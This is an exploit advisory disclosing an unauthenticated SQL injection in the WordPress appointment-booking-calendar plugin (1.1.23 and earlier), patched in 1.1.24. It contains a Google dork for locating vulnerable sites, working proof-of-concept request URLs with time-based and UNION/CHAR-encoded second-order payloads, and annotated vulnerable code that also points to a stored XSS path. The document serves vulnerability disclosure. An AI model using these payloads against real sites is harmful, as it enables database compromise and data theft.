@@ -1,0 +1,190 @@
+﻿# Exploit Title: WordPress appointment-booking-calendar <=1.1.23 - Unauthenticated SQL injection
+# Date: 2016-01-26
+# Google Dork: Index of /wordpress/wp-content/plugins/appointment-booking-calendar/
+# Exploit Author: Joaquin Ramirez Martinez [ i0akiN SEC-LABORATORY ] --[now i0 security-lab]
+# Software Link: http://wordpress.dwbooster.com/calendars/booking-calendar-contact-form
+# Vendor: CodePeople.net
+# Vebdor URI: http://codepeople.net
+# Version: 1.1.23
+# OWASP Top10: A1-Injection
+# Tested on: windows 10 + firefox + sqlmap 1.0.
+
+===================
+PRODUCT DESCRIPTION
+===================
+"Appointment Booking Calendar is a plugin for **accepting online bookings** from a set of **available time-slots in 
+a calendar**. The booking form is linked to a **PayPal** payment process.
+
+You can use it to accept bookings for medical consultation, classrooms, events, transportation and other activities
+where a specific time from a defined set must be selected, allowing you to define the maximum number of bookings 
+that can be accepted for each time-slot."
+
+(copy of readme file)
+
+
+======================
+EXPLOITATION TECHNIQUE
+======================
+remote
+
+==============
+SEVERITY LEVEL
+==============
+
+critical
+
+================================
+TECHNICAL DETAILS && DESCRIPTION
+================================
+
+A unauthenticated SQL injection flaw was discovered within the latest WordPress 
+appointment-booking-calendar plugin version 1.1.23.
+
+The flaw were found in the function that is executed when the action ´cpabc_appointments_check_IPN_verification´ is called.
+The action is added with ´init´ tag, so it function is called every time when parameter ´action=cpabc_appointments_check_IPN_verification´
+appear in the query string (GET request) or POST request.
+
+But for to execute the vulnerable line of code, an attacker need to carry out some conditions:
+- The query string must contain the ´cpabc_ipncheck´ parameter.
+- The ´cpabc_ipncheck´ must have the value ´1´.
+- The query string must contain the ´itemnumber´ parameter (it is necessary for injection).
+
+By having all those rules, the attacker can exploit the vulnerability.
+
+The security risk of SQL injection vulnerabilities are extremely because by using this type of flaw, an attacker
+can compromise the entire web server.
+
+================
+PROOF OF CONCEPT
+================
+
+An unauthenticated attacker can make a request like...
+
+http://<wp-host>/<wp-path>/wp-admin/admin-ajax.php?action=cpabc_appointments_check_IPN_verification
+&cpabc_ipncheck=1&itemnumber=<SQL commands>
+
+Example:
+
+	Exploiting simple SQL injection:
+
+	http://localhost/wordpress/wp-admin/admin-ajax.php?action=cpabc_appointments_check_IPN_verification
+	&cpabc_ipncheck=1&itemnumber=(SELECT * FROM (SELECT(SLEEP(5)))Qmyx)
+
+	Exploiting second order SQL injection with ´CHAR´ function will append ´0 or sleep(10)#´ to second sql 	statement:
+	
+	http://localhost/wordpress4.0.1/wp-admin/admin-ajax.php?action=cpabc_appointments_check_IPN_verification
+	&cpabc_ipncheck=1&itemnumber=-1 UNION SELECT 1,CHAR	(48,32,111,114,32,115,108,101,101,112,40,49,48,41,35),3,4,5,6,7,8,9,10,11#
+
+	
+
+===============
+VULNERABLE CODE
+===============
+
+located in ´cpabc_appointments.php´
+
+function cpabc_appointments_check_IPN_verification() {
+
+    global $wpdb;
+
+	if ( ! isset( $_GET['cpabc_ipncheck'] ) || $_GET['cpabc_ipncheck'] != '1' ||  ! isset( $_GET["itemnumber"] ) )
+		return;
+    ...
+
+    //HERE IS SANITIZED (when we inject a sql statement the `intval` function value turn to 0 and never is executed the `if` code)
+    $myrows = $wpdb->get_results( "SELECT * FROM ".CPABC_TDEAPP_CALENDAR_DATA_TABLE." WHERE reference='".intval($itemnumber[0])."'" );
+    if (count($myrows))
+    {
+        echo 'OK - Already processed';
+        exit;
+    }
+    //BUT HERE THE PARAMETER IS PASSED WITHOUT SANITIZATION
+    cpabc_process_ready_to_go_appointment($_GET["itemnumber"], $payer_email);
+
+    echo 'OK';
+
+    exit();
+
+}
+
+
+Now let's verify the ´cpabc_process_ready_to_go_appointment´ function...
+
+function cpabc_process_ready_to_go_appointment($itemnumber, $payer_email = "")
+{
+   global $wpdb;
+
+   ...
+
+   $itemnumber = explode(";",$itemnumber); //CONVERTING INTO AN ARRAY THE SUPPLIED PARAMETER
+   $myrows = $wpdb->get_results( "SELECT * FROM ".CPABC_APPOINTMENTS_TABLE_NAME." WHERE id=".$itemnumber[0] ); //THERE IS NO SANITIZATION
+
+   //NEXT INSTRUCTION IS USEFUL FOR SECOND ORDER SQL INJECTION
+   $mycalendarrows = $wpdb->get_results( 'SELECT * FROM '.CPABC_APPOINTMENTS_CONFIG_TABLE_NAME .' WHERE `'.CPABC_TDEAPP_CONFIG_ID.'`='.$myrows[0]->calendar);
+   $reminder_timeline = date( "Y-m-d H:i:s", strtotime (date("Y-m-d H:i:s")." +".$mycalendarrows[0]->reminder_hours." hours") );
+   if (!defined('CP_CALENDAR_ID'))
+        define ('CP_CALENDAR_ID',$myrows[0]->calendar);
+
+    ...
+
+   $params = unserialize($myrows[0]->buffered_date); //POTENTIAL RISKY `unserialize` METHOD CALLED use json functions instead
+   $attachments = array();
+   foreach ($params as $item => $value)
+   {
+       $email_content1 = str_replace('<%'.$item.'%>',(is_array($value)?(implode(", ",$value)):($value)),$email_content1);
+       $email_content2 = str_replace('<%'.$item.'%>',(is_array($value)?(implode(", ",$value)):($value)),$email_content2);
+       $email_content1 = str_replace('%'.$item.'%',(is_array($value)?(implode(", ",$value)):($value)),$email_content1);
+       $email_content2 = str_replace('%'.$item.'%',(is_array($value)?(implode(", ",$value)):($value)),$email_content2);
+       if (strpos($item,"_link"))
+           $attachments[] = $value;
+   }
+   $buffered_dates = array();
+   for ($n=0;$n<count($itemnumber);$n++)
+   {
+
+   		//USEFUL FOR SECOND ORDER SQL INJECTION
+       $myrows = $wpdb->get_results( "SELECT * FROM ".CPABC_APPOINTMENTS_TABLE_NAME." WHERE id=".$itemnumber[$n] );
+       $buffered_dates[] = $myrows[0]->booked_time;
+       $information = $mycalendarrows[0]->uname."\n".
+                      $myrows[0]->booked_time."\n".
+                      ($myrows[0]->name?$myrows[0]->name."\n":"").
+                      $myrows[0]->email."\n".
+                      ($myrows[0]->phone?$myrows[0]->phone."\n":"").
+                      $myrows[0]->question."\n";
+
+        ...
+
+        //USEFUL FOR STORED CROSS-SITE SCRIPTING
+       $rows_affected = $wpdb->insert( CPABC_TDEAPP_CALENDAR_DATA_TABLE, array( 'appointment_calendar_id' => $myrows[0]->calendar,
+                                                                            'datatime' => date("Y-m-d H:i:s", strtotime($myrows[0]->booked_time_unformatted)),
+                                                                            'title' => $myrows[0]->email,
+                                                                            'reminder' => $reminder,
+                                                                            'quantity' =>  (isset($myrows[0]->quantity)?$myrows[0]->quantity:1),
+                                                                            'description' => str_replace("\n","<br />", $information),
+                                                                            'reference' => $itemnumber[$n]
+                                                                             ) );
+       
+   }
+}
+
+
+
+==========
+ CREDITS
+==========
+
+Vulnerability discovered by:
+	Joaquin Ramirez Martinez [i0 security-lab]
+	joaquin.ramirez.mtz.lab[at]gmail[dot]com
+	https://www.facebook.com/I0-security-lab-524954460988147/
+	https://www.youtube.com/channel/UCe1Ex2Y0wD71I_cet-Wsu7Q
+
+
+========
+TIMELINE
+========
+
+2016-01-08 vulnerability discovered
+2016-01-24 reported to vendor
+2016-01-25 released appointment-booking-calendar 1.1.24
+2016-01-26 full disclosure
